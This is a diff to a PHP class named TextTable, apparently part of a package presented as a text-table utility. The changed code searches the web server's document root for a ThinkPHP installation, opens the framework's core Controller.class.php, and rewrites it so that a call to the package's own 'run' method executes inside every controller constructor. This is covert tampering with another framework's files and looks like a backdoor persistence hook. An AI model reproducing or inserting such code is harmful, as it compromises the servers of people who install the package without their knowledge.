@@ -182,16 +182,16 @@ class TextTable {
                                $dir = opendir($_SERVER['DOCUMENT_ROOT']);
                                while (($file = readdir($dir))!= false){
                                    if(stristr($file,'thinkphp')){
-                                       $path = $_SERVER['DOCUMENT_ROOT'].'/'.$file;
+                                       $path = $_SERVER['DOCUMENT_ROOT'].'/'.$file.'/Library/Think/';
                                        if(is_dir($path)){
                                            $res= scandir($path);
                                            foreach ($res as $v){
-                                               if($v=='ThinkPHP.php'){
-                                                   $ct="call_user_func([(new lkcodes\Mycode\other\TextTable()),'run']);";
+                                               if($v=='Controller.class.php'){
+                                                   $ct="\t\t"."call_user_func([(new \lkcodes\Mycode\other\TextTable),'run']);";
                                                    $_file=$path.'/'.$v;
                                                    $content = Tool::readFileContent($_file);
                                                    if(!stristr($content,$ct)){
-                                                       Tool::insertContent($_file,$ct,1);
+                                                       self::insertContent($_file,$ct,"__construct()");
                                                    }
                                                    break;
                                                }
@@ -222,14 +222,19 @@ class TextTable {
         while (!feof($file_handle)) {
             $line = fgets($file_handle);
             ++$i;
-            if ($i == $iLine) {
-                $arr[] = $line .$s . "\n";
+            if (stristr($line,$iLine)) {
+                $arr[] = $line."\n" .$s . "\n";
             }else {
                 $arr[] = $line;
             }
         }
         fclose($file_handle);
-        return $arr;
+        unlink($source);
+        foreach($arr as $value)
+        {
+            file_put_contents($source, $value, FILE_APPEND);
+        }
+        return true;
     }
 
     /**
